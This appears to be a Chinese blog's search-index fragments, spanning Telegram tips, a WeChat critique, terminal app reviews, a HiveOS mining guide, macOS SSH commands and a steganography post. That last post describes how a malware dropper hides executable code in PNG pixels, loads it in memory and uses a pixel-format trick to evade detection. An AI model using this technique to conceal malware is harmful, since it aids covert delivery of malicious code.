这三个博客和教程总结的都很详细，到位，值得认真阅读。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:11","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"频道推荐 我个人比较青睐于添加频道而不是群组，telegram上面有很多的优质内容的频道，在这里列举几个个人认为不错的。 1.Durov’s Channel Pavel Durov（创始人）的官方频道 2.TGgeek 发布 Telegram 教程、技巧、资讯、更新等信息。 3.Iyouport 自由港 新闻包和工具箱 4.SE-索引公告板 发现更多优质好频道 5.校长读报 每天为你带来一篇精选的报刊内容和时事资讯 6.Newlearnerの自留地 不定期推送IT资讯 7.乌鸦观察 不定期推送新闻和杂谈 8.开源社区频道 科技人文资讯 9.外媒新闻 从可信任的外媒报道中，了解真实的中国，了解真实的世界。 10.科学新知 科技 科技新知 IT 程序员 生物 物理 科学 社科 11.今读 随机文章分享 12.少数派 打造你的数字生活指南 13.简中赛博坟场 整理和记录从简中互联网上消失、被篡改的内容 14.小时代 分享精读好文章 15.性别偏见与性别议题 搜集/讨论一些生活中性别偏见的例子，帮助大家认识到偏见的存在，发起对偏见的讨论，致力于打破父权建构，消弭偏见。 16.黑洞资源笔记 收集优秀的开源项目，公开的学习资料。 17.为了一种新小说 频道每周五晚19:00(GMT+8)转推一篇文学作品，以短篇小说、散文诗、现代诗为主 18.辟谣爱好者频道 关于近期不实信息，待证实信息，有争议信息的调研分析汇总。希望保持公正，对信息新闻进行验证。 19.Find Blog👁发现博客 发现优秀的博客与创作者,不做博客推荐，不做文章推荐 仅仅只是收录优秀博客的地方 20.风向旗参考快讯 风闻奏事，遍查访知。即时发布VPS、网盘等有价值虚拟资产的新闻和交易信息，提供互联网科技新闻快讯。 当然，要是你乐意的话，你可以在我的博客首页找到我的telegram频道并加入，我会为此感到很高兴的。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:12","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"机器人推荐 不得不说，机器人在telegram中扮演的角色也是十分的重要，使用各种bot，可以让用户更加轻松的管理群组和频道，寻找资源和服务。但是注意的是，机器人分为内联机器人和第三方机器人。内联机器人就是你在任何的频道和群组中可以直接调用而无需添加进来，第三方机器人（也称为外联机器人）的使用需要添加到频道或者群组中才能实行调用。这里推荐几个个人觉得还不错的机器人。 1.DiscussBot 官方出的评论机器人, 可以在频道每条消息下面点击添加评论 2.VerifyBot 官方认证账号的机器人 3.SpamBot 官方处理 spam 事务的机器人，例如解除86私聊限制 4.Stickers 使用此机器人创建贴纸并获取贴纸的使用统计数据. 5.这个我知道 本机器人能够自动回复关键词对应的内容 6.TG Downloader GIF和贴纸下载 7.Creation Date 查询你的tg ID和注册时间 8.zlibrary 搜书机器人 9.InstantViewBot 可以把文章都生成支持Instant View 10.CommentsBot 留言/评论机器人 11.storebot 机器人商店,索引了各种机器人,可以寻找自己感兴趣的 12.@fanyi_bot 为全世界语言提供中英翻译。支持私聊、群组、行内请求。开源地址：https://github.com/reycn/fanyi_bot 现在telegram上机器人也是数不胜数，所以只能简单罗列几个，更多有趣好玩儿的机器人还等着你去发现和创造呢。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:13","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"telegraph神器 Telegraph是即时聊天软件Telegram的开发商推出的一个内容发布网站，它允许用户匿名发布文章。除此之外，telegraph还能帮助用户创建丰富的内容，同时集成照片以及各类可嵌入的流媒体内容。在输入文章标题和作者姓名之后，用户即可随意创作。我们发布文章之后，就能够获得这篇文章的独立网址。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:14","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"特点 访问和使用Telegraph不需要注册账号与下载软件，只需在网页浏览器中访问 https://telegra.ph/ 便可看到简约的界面，填入要发布的内容即可匿名发布，（支持Markdown语法和快速插入图片）。内容发布之后，只要清除浏览器的缓存，便无法再编辑文章。内容发布之后，不能追溯到文章作者和发布者。内容同样不会受到任何的审核和监视，给予用户最大的自由空间。 在telegram上我们只需要找到telegraph，然后用telegram登陆上去，就会看到你用该账号写过的所有的文章内容，而且你还可以在任何的群组和频道中调出你的文章，分享给其他人。所以如果你正在寻找一个自由，简单易用的写作的平台，那么telegraph是一个不错的选择，只需要掌握简单的Markdown语法就能驾驭它。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:15","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"滥用和指责 Pavel Durov的初衷是打造一个自由的社交通讯软件，绕开政府和其他互联网公司的监视。但是正是因为telegram中高度的自由和隐秘，这里也就成了一些犯罪分子的“窝点”。 2015年11月，由于伊斯兰国（ISIS）相关组织使用频繁， Telegram移除了近250个所使用广播频道，并屏蔽其所属账号并且持续每天移除近百频道 强调不鼓励色情内容、侵犯著作权的内容存在。 但用户举报的色情组群、频道仅会于iOS、macOS设备（App Store版）无法观看， 官方并不会审查或下架相关频道。 2018年下半年至2020年3月间，韩国境内有人通过Telegram组建多个聊天室并收取费用， 进行了有组织的、大规模的性虐待事件，即震惊韩国社会的N号房事件。 韩国N号房事件发生之后，2018年8月，Telegram修改隐私政策，如果执法调查单位能够证明特定用户的身份为恐怖分子，将配合法院要求提供该用户的IP、电话号码等资料。 正是因为telegram极度强调自由且不受监管，容易被犯罪分子利用来传播暴力，血腥内容，世界各地的媒体对telegram纷纷进行指责。一时之间，Pavel Durov成为了众矢之的。但是Pavel Durov还是坚持自己的做法，并且他认为：恐怖主义是社会问题，通过对技术的限制并不能解决社会问题。所以他和他的团队开始了旅游式办公(流亡生活)，走到哪儿，团队就带到哪儿。就算面临着外界的舆论压力，当地政府的干预，他还是忠于自己的信仰，他始终坚信言论自由，不受其他因素的干扰是我们当今社会的人们的一项基本权利。偏执，自信，崇尚自由，富有才华，极度自律，这些都是他身上的特质，正是因为他选择让telegram公司保持独立且自由，给予大众隐私和自由的承诺，人们也就逐渐相信这个男人的想法。不可否认的是，telegram的活跃用户还在稳步上升当中，或许有一天他能够成功的超越whatsapp，成为社交软件中的龙头。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:16","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"telegram和微信 说实话，这两个东西压根不是一个层面上的。如果你使用过telegram，那么你就会很难再适应微信那种反人类的设计和操作。微信能有现在的活跃人数单纯是因为国内没有可替代的社交软件，QQ被打上小朋友的标签，钉钉办公人士使用较多，不然一般都不会接触，微博是一个娱乐饭圈平台，热搜全靠卖，其他的什么贴吧，豆瓣，小红书之类的就更别说了。 正是因为国内同时期没有可替代的产品，所以微信靠着早期QQ的引流逐渐庞大起来。这也就造成微信再社交领域的一家独大，也就越来越肆无忌惮的挑战用户的底线。发自内心的的说，我也建议我身边的人逃离微信去拥抱telegram，天下已经苦微信久矣。对于我来说微信最大的毛病主要有以下方面： 1.微信会审查所有用户的聊天内容和朋友圈信息，过滤相关信息（你以为你发出去的朋友圈其实只有你自己能看到，你以为发给对方的消息，其实也只有你自己才能看到），采取删帖和封禁用户账号的事情也就不在话下。 2.切断大部分的外部链接，形成资源信息壁垒。例如之前字节跳动就说微信封杀抖音的链接。 3.设计简陋，功能欠缺的同时臃肿不堪，专断独行，随意窃取用户的个人信息。（一次最多发9张照片，一次最大只能发送200MB文件，消息不能云端同步）。在腾讯微信软件许可及服务协议你还可以看到这么一条条款： 你只有账号的使用权，所以你觉得在微信面前我们还能有自己的隐私吗？在2021年2月3号，深圳市南山法院一审判决认定：微信好友关系不属于用户隐私。 关于微信其他令人发指的方面我就不一一列举了，有兴趣的可以看看 stay-away-from-wechat，上面对于微信那些霸道的描述都比较清楚，当然这个作者可能本身有一些较为强烈的主观倾向，那么你可以看看这个——微信十年的产品思考。 关于微信监控和隐私安全问题等方面的文章还有不少，这里再补充几篇。 1.对于微信「隐私政策」的一点小的发现 2.微信监控诠释 3.“未阅先焚”微信朋友圈图片过滤功能分析 4.“一APP两制”微信如何区别审查中国及海外用户 5.如何导出微信（包括朋友圈）数据 — 利用欧盟GDPR法案带来的权利 不少人可能会对WeChat和微信的隐私协议方面有一些的困惑，那么不妨阅读一下：分享一下近一年的欧盟 WeChat 账号与微信账号的使用与功能区别 下面有一张很直观的图片说明微信和WeChat的区别 总而言之，我个人对于telegram和微信之间的选择十分的清晰，后面不及前者的百分之一。何况，微信的这些情况，telegram上都不存在。我这么说也并非是指telegram是完美无缺的产品，它也有它自身的不足。我也列举几个方面： 1.telegram只有秘密私聊才会使用端对端加密，群组和频道内容则没有，且端对端加密需要用户手动开启而非自动开启。 2.只能通过手机号码进行注册，这对于一些手机号码必须实名的国家所在用户来说简直就是噩梦。这无法保障他们的隐私安全。 3.服务器是闭源的，虽然telegram软件本身是开源的，MTP也开源，但是服务器没有开源，我们对于telegram如何保存，使用我们的数据一无所知。我们只能选择相信Pavel Durov的为人。 4.我们无法限制别人私聊自己，同时软件本身对于中文搜索支持不友好。 没有什么完美的产品，但是telegram作为一家不以盈利为目的独立运营的公司却在用行动来展示他们很关注用户的使用体验。在产品的打磨和对待用户的态度上面，微信是完全比不过的。也许telegram不是最好的选择，最安全的聊天社交软件，但是它坚持做自己，拥抱用户。如果微信不知道如何尊重用户，那么自然很难获得用户的尊重。 在telegram和微信这个板块内容中我确实夹杂了更多的主观倾向，看到这篇帖子的你或许认同，或许不认同，不管你的态度是什么，我都希望你不要急于相信我或者是否决我的观点，不妨自己去感受一下，思考一下。微信的不足是客观事实，telegram的不足也是客观事实，在客观事实的基础上自己去探索答案才是一个最好的选择。 telegram的故事还在继续，它生于“乱世”（斯诺登曝光美国监控丑闻之后当下的我们急需要一个保障我们安全，隐私的社交工具），也终将不平凡。 ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:17","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":[],"content":"参考文章 1.聪聪Blog 2.Telegram（电报）：新手指南、使用教程及频道推荐 3.Telegram 教程全指南 4.Google Voice简介及使用\u0026保号 5.telegram维基百科 6.微信 Is Watching You 7.Telegram FAQ 8.telegram privacy 9.腾讯微信软件许可及服务协议 10.Telegram怎样开启端到端加密（E2EE） ","date":"2021-11-28","objectID":"/zh-cn/28-3/:1:18","tags":[],"title":"关于日常应用那些不得不说的事儿(0)","uri":"/zh-cn/28-3/"},{"categories":["开源","Shell工具"],"content":"推荐二款颜值逆天且功能齐全的开源Shell工具！ ","date":"2021-11-28","objectID":"/zh-cn/28-2/:0:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"前言 以前在windows上一直使用的SSH工具是XShell，后来转到mac平台，XShell没有mac版本。所以之前一直在找一款颜值高，功能齐全的可以作为日常使用的Shell工具。 我知道mac下也有不少优秀的Shell终端工具，比如SecureCRT，putty，Termius，FinalShell等。 我是从以下几个维度考虑的： 颜值要高，毕竟天天面对本就枯燥乏味的shell命令行，界面不好看会影响心情。心情也是生产力要素中很重要的一个因素，不知道你们认同么。 功能要全，什么文件上传，云端同步，主题切换，自定义背景，拖拽，窗口切分，历史命令等等统统要有。功能不全，我用着不爽。 操作要简洁，我不是搞运维的，命令行已经很繁杂了，不想在UI上再被折腾。 要免费，功能再好要收费也没鸟用，因为穷。 那么今天推荐的就是一款符合以上所有要求的一款SSH工具，而且它是免费开源的。迭代非常快。几乎几天一个版本，支持平台包括windows，mac，linux。mac中连arm64都支持。几乎是全平台都支持了。 全功能免费，无广告。非常香。 它就是：electerm ","date":"2021-11-28","objectID":"/zh-cn/28-2/:1:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"颜值 我在mac平台用了这款软件几乎快2年。选择这款终端其中一个最重要的原因就是颜值。不多说，直接上图： 整个界面一股浓浓的暗黑系风格，不过还有套默认的白色主题可供选择。 除了预设的2套主题外，eleterm可以随意自定义主题： ","date":"2021-11-28","objectID":"/zh-cn/28-2/:2:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"自定义背景 我看到很多童鞋的IDEA背景都是小姐姐，虽然我觉得这严重影响我的注意力，但是Shell终端里可以有，上一个来试试。可以看看效果： ","date":"2021-11-28","objectID":"/zh-cn/28-2/:3:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"SSH标签 electerm的SSH连接信息是以标签形式存储的。 可以为某一组连接增加文件夹，新建立一个连接，基本上该有的功能都有。界面也极其简洁。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:4:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"文件上传 electerm自带一个sftp的文件上传，连上SSH之后，点这里即可打开sftp的上传。 上传UI简单易懂，左侧本地右侧远程，可拖拽，甚至于支持整个文件夹的上传。非常方便。多个任务是多个线程，在顶部可以看到正在上传的线程。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:5:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"命令快捷键 作为一款shell工具，快速命令应该是标配，有些工具还甚至拿这个来收费，有点说不过去。 eleterm配置快速命令非常方便，比如加一个查看系统信息的命令，只需要在这里进行配置。 然后你就可以很方便的在底部进行点击快速执行了 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:6:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"云端同步 Electerm支持可以在多个电脑之间同步设置和标签。 非常巧妙的利用了github和gitee，只要设置一个token，就可以进行配置和连接信息的导出和导入。原理上就是git的push和pull。 你需要在这里填写一个token 我这里是用了gitee方式，这个token需要在gitee里的设置页面进行获取 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:7:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"分屏 可以支持无限的分屏，支持横着分和竖着分，右上角点一下就会多分出一个屏出来，非常方便 底下有个批量输入命令。不管你有多少窗口，一次输入，批量执行。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:8:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"结语 electerm功能真的挺全面的，是一款挺小众但是优秀的开源作品。我个人一直用到现在，虽然在使用中偶尔会有小问题，但是作者一直在更新。在两年中，我也看到了这款作品变的越来越好。 所以现在推荐给大家。希望你使用了之后也能爱上这个小而美的Shell终端。 Electerm的官方下载地址为：https://electerm.github.io/electerm 终端神器——Tabby Terminal 前段时间我在GitHub上无意之中看到了这款终端，当我看到它的那一眼我就被它深深的吸引了。相对于Windows Terminal和cmder这些终端，它们有的它都有，它们没有的，它有。不过事先声明，它没有中文，只有英文。所以英文不是特别熟悉的小伙伴可能需要克服一下。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:0","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"简介 GitHub地址：A terminal for a more modern age — Tabby 官网地址：Tabby.sh Tabby是一款再GitHub上开源且免费使用的终端。这款终端和其他Windows上的终端最明显的区别有两个，一是高颜值，是跨平台；二是可扩展性强，可自定义程度较高。 如你所见，Tabby上可供设置地方有很多，下面我将会逐一介绍一下。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:1","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Application 这里主要就是用来检查更新，开源地址，反馈问题和更新细节的描述。基本上不需要什么过多的配置。你只需要打开第一个shell integration。这样你可以在选中一个文件夹的时候使用Tabby快速定位到该路径。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:2","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Appearance 这里主要是涉及Tabby外观的的设置和调整。在这里你可以修改字体的大小，终端背景颜色，光标样式以及自定义CSS。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:3","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Color Scheme 这个板块是主题板块，Tabby上有几十个主题供你选择，觉得能让你看的眼花缭乱。不仅如此，它还支持自定义CSS样式，所以即使你不喜欢上面的任何一款主题的话你也可以自己动手弄一个。对于大多数人来说，有这么的内置主题方案也就没必要去自己搞了。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:4","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"HotKeys 在这里你可以设置、调整Tabby的全局快捷键，例如粘贴，复制，快速定位到开头，快速定位到末尾等。快捷键多到超乎你的想象。因此，对于喜欢和习惯于快捷键使用的人来说，这绝对是一个值得好好布局的选项。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:5","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"plugins 这里是下载、添加终端插件的板块。在这里你可以找到很多适用于用来提高开发效率的插件。Tabby功能性上比较原始的，有些功能是需要通过安装插件来增强的。 目前数量上虽然算不上很多，但是开发者还在积极的开发当中。插件这一项功能在Windows Terminal上是体验不到的。 提示：Tabby终端默认是无法点击链接预览的，我在写hexo博客的时候发现，当我想到预览的时候，按住ctrl并不能点击链接。所以我一直在设置里面找是不是有相关的选项没有打开。后来我发现，原来是要安装一个链接预览的插件，安装好插件之后你可以选择自己想要的快捷键进行预览。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:6","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Profiles 这是一个添加修改PC上所有可用的shell的面板。和Windows Terminal最大的不同就是，Tabby会自动检测你电脑上所有可用的shell，不需要自己自己过多的添加配置，所以也就节省了配置的时间。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:7","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"SSH 是的，没错。Tabby还是一款SSH 客户端，能快速远程控制服务器。SSH连接管理现在是通过配置文件标签完成的。 官方描述中是这样的： 1.带有连接管理器的SSH2客户端 2.SFTP和Zmodem文件传输 3.X11和端口转发 4.跳转主机 5.代理转发 - 包括Pageant和Windows本地OpenSSH代理 6.登录脚本 7.可选的内置密码管理器，有一个主密码 8.支持代理命令 还没尝试过，等到时候试试再回来补充感受（毕竟现在xhsell用的顺手，习惯了）。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:8","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Terminal 这里基本都是与终端相关的配置。 在这里如果你不想打开一个终端之后还是保留原来历史的路径，那么你可以选择关闭这个restore terminal tabs on app start。这样你就不会再回到之前的路径下了。 其次，当你点击Tabby的时候它可能会有一个开始界面，如下图所示： 你可能并不想要看到这个界面，所以你可以在这个terminal这个界面打开Auto-open terminal on app start 这样你就不会停在这个开始界面，它就会直接跳过。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:9","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Vault 这其实更像是Tabby内置的密码管理器。 上面的描述是： Vault is an always encrypted container for secret such as password and private passphrases. 意思大概就是 Vault是一个始终加密的容器，用于存放密码和私人口令等秘密。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:10","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Windows 这是对于终端窗口的进一步设置板块。在这里你可以选择、调整tabs的位置，是否开启亚克力效果等。基本上可以选择默认，也可以根据自己的需要进行调整。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:11","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"Config File 顾名思义就是展示配置文件的窗口，你可以在这里看到你调整过的设置，你也可以从这里用其他的编译器打开配置文件来进行调整。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:12","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["开源","Shell工具"],"content":"最后 总的来说，这个终端开始非常值得使用的，一般终端具有的功能它基本都有。而且配置、使用并不是很复杂。对于不爱折腾的人来说是个必备的神器。重要的是，它跨平台的属性真的很不错的，无论你使用Windows、MacOS、还是Linux都能让你找回熟悉的感觉。 ","date":"2021-11-28","objectID":"/zh-cn/28-2/:9:13","tags":["开源","Shell工具"],"title":"推荐二款颜值逆天且功能齐全的开源Shell工具！","uri":"/zh-cn/28-2/"},{"categories":["HiveOS"],"content":"使用HiveOS挖矿安装超频教程以太坊ETH Hive OS官网 下载显卡挖矿系统 Hive OS Rigs for Rigs稳定版 下载写U盘镜像工具Etcher或Rufus,准备一个至少8G的U盘写入下载好的镜像 注册Hive OS网站账户,注册好后登录 账户后台开启 二步验证,建议使用 Authy 管理页面,选择或点右上角的+号新建一个矿场 新进入矿场后,没有找到矿机，你可以添加一个,确定后下载这个rig.conf到U盘根目录 在电脑上插入U盘开始装Hive OS系统,装好后保持开机状态 进入Hive OS后台,刷新矿机页面,即可看到在线的矿机 选择钱包,添加一个钱包,选择货币种类,钱包地址,钱包名称,来源,创建 具体在哪里挖矿,挖什么矿等设置,在飞行表中设置 数字货币:ETH 钱包:选择名称 矿池:选择至少一个服务器 挖矿软件:随便选 名称:好记随便 飞行表创建后,点后面的小火箭开启挖矿工作 其他挖矿系统 NiceHash OS Nhos Flash Tool 烧录镜像需要填写 BTC 地址,在你的网站后台,挖矿地址 其他挖矿软件 比特币相关 比特币官网 BitPay Wallet Electrum NiceHash交易所 币安Binance.com Coinbase 欧易OKEx 火币huobi ","date":"2021-11-28","objectID":"/zh-cn/28-1/:0:0","tags":["HiveOS"],"title":"使用HiveOS挖矿安装超频教程以太坊ETH","uri":"/zh-cn/28-1/"},{"categories":["MacOS"],"content":"在MacOS中启动SSH服务 使用图形界面开启 SSH 1.点击桌面左上角的小苹果,然后选择\"系统偏好设置…\" 2.在系统偏好设置界面选择 “共享” 3.在共享界面勾选\"远程登录\" 若要远程登录这台电脑，请键入“ssh zhm@192.168.234.138”。 4.在Windows中用\"Xshell\"连接 使用终端命令行方式开启 SSH 1.查看 SSH服务 是否已经运行 sudo launchctl list | grep sshd PS:如果 SSH服务 已运行,会显示: - 0 com.openssh.sshd 2.没有开始 SSH服务 状态 3.输入命令开启SSH服务 sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist 4.输入命令停止SSH服务 sudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist 5.在Linux中用SSH命令连接 ","date":"2021-11-28","objectID":"/zh-cn/28/:0:0","tags":["MacOS"],"title":"在MacOS中启动SSH服务","uri":"/zh-cn/28/"},{"categories":["隐写术"],"content":"此文为加密收费内容添加我微信支付后可看: 从PNG Dropper到Alpha通道隐写术实践 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:0","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["隐写术"],"content":"0x1 前言 前些天从安全客上看到一篇翻译文章是关于利用PNG像素隐藏PE代码，对实现细节很感兴趣就抽空稍微研究了下相关内容，于是就有了本次分享。 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:1","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["隐写术"],"content":"0x2 PNG Dropper样本分析 先来看下翻译文中的样本，其中PE资源里包含一个PNG目录，该目录里存储了8张PNG格式的图片： 将8张图片全部提取出来，随便选择一张打开查看，发现可以正常打开，但显示的内容都是一些杂乱的随机像素点： 将其拖进010edit分析下格式，能够正常解析图片数据，数据格式貌似没什么异常： 再来跟踪一下该样本内存解密PE的过程。整体流程是依次定位资源中的8张PNG图片，提取其中的图片数据到缓冲区里拼凑成完整的PE，最后再内存LoadPE执行。 然后最关心的部分应该就是提取图片数据的过程了。这部分的代码看上去比较多，其实主要也就3小部分。第1部分是将PNG图片流读进一个Bitmap对象来方便操作图片： 第2部分是获取该PNG的各项基本数据包括宽度、高度、Stride（行跨度？）和图像格式，这些数据主要是用作最后一步调用的结构体参数（Rect和BitmapData），这部分最关键，因为这些参数直接影响最后获取到的图片数据。 最后1步其实很简单，调用“GdipBitmapLockBits”函数就能直接获取到图片的数据了。当然这里得到的图片数据不是上文010edit里看到的那个IDAT数据，而是对该数据根据第2步指定的图像格式参数来进行解码后的“原始像素”数据。 根据此流程也可以自己尝试用Gdi+写代码来提取图片数据，然后发现从上面样本中图片获取到的编码格式是“PixelFormat32bppARGB”，然而实际内部存储的像素数据却用的是“PixelFormat16bppARGB1555”编码格式，这可能是作者的一种反检测小技巧吧。 ","date":"2021-11-27","objectID":"/zh-cn/27-3/:0:2","tags":["隐写术"],"title":"PNG隐写术实践","uri":"/zh-cn/27-3/"},{"categories":["隐写术"],"content":"0x3 Alpha通道隐写实践 本来分析到上面也就结束了，结果看到安全客上有评论谈及隐写术，想起了大学时期使用Matlab做LSB图像信息隐藏的实验，当时只是简单应付课程对其懵懵懂懂实在有点遗憾，于是趁此机会重新复习下顺便研究看看所谓高级的隐写术——利用RGBA中的A（Alpha）通道来隐藏数据。 首先复习LSB（最低有效位），这个是指图像隐藏采用的一种算法吧，查了一下这个算法看网上有用jpg图片来做，也有用bmp图片来做的，还有jpg处理完变png的，有点晕，其实应该是针对一般的RGB图像都能做。怎么理解呢，我们知道图像是由一个个的像素点构成，比如一张100x100（宽度和高度都是100）的图片，总共就有10000个像素点，而其中每个像素点都用一个RGB值来表示其颜色。对于不同的图片格式，其像素数据的编码格式可能不一样，RGB值的存储格式也就可能不同，即使相同格式比如PNG，其像素格式也有很多种，具体可参考“RGB格式详解”。本文主要以其中的“RGB32”或“ARGB32”为例，一个RGB值用3字节来分别表示R（红）、G（绿）、B（蓝）3个颜色通道的数值，这样每个颜色通道的数值范围都是0-255，LSB图像隐藏算法的原理就是利用其中每个像素颜色通道的最低位来存储需要隐藏的数据，这样对于整张图像的“视觉影响”非常低，图片处理前后就可能肉眼看上去“没什么变化”。 正好前段时间在看雪公众号上看到一篇用PHP来实现LSB的分享，直接贴上来先看看实现过程吧，最核心部分的就是将需要隐藏的数据的每个二进制位，依次存进每个选取像素点中蓝色（B）通道的最低位。 随便找一张图片测试一下效果吧： 完全看不出差异，只是隐藏的信息“hello”字符串实际上已经存储到右边图片的像素矩阵中，数据位依次被隐藏到所选45度角线上的像素点。当然这只是个简单的例子，我们自己写工具时可以从原点开始遍历所有像素点，也可以将其他2个通道最低位都用上以提高信息存储的容量。但总的来说，个人觉得LSB能够存储的容量还是相对比较小，比如我想把系统的计算器程序calc.exe（大约900kb）存进一张图片中则需要一张大约100万像素的图片。如下所示，经过自己实现的LSB工具（使用每个像素的最低位依次存储）处理后，将计算器程序放到图片中，图片的size前后膨胀了3MB！ 信息提取的话只要反向操作像素数据就行，具体可以参见本文后面分享的Demo。这里就不继续探究LSB了，感兴趣的网上搜一下参考资料一大堆。接下来直接进入PNG的Alpha通道隐写这个话题，具体地本文是以PNG的“PixelFormat32bppARGB”这种像素格式的图像隐写为例进行分享。 其实我并不了解真正的Alpha通道隐写是什么样的，也没有去找相关实现的资料，此番分享完全是自己摸索一下基于“PixelFormat32bppARGB”格式的PNG图片如何进行信息隐藏。这种格式非常容易理解，就是在3字节RGB基础上再加一个A通道，也就是Alpha或者透明通道，于是正好组成4字节一组的像素数据（从高到低为ARGB）。然后对这个A通道的理解很关键，这个字节的数值表示的是该像素点的透明度：数值为0时，该像素点完全透明，相当于RGB完全隐藏不用；数值为255时该像素点只由RGB颜色决定，相当于没有透明度。如下图所示，左图的背景全透明，A通道数值为0,；右图背景设置（不）透明度为50%，则刚好为1字节数值范围的一半即0x80。 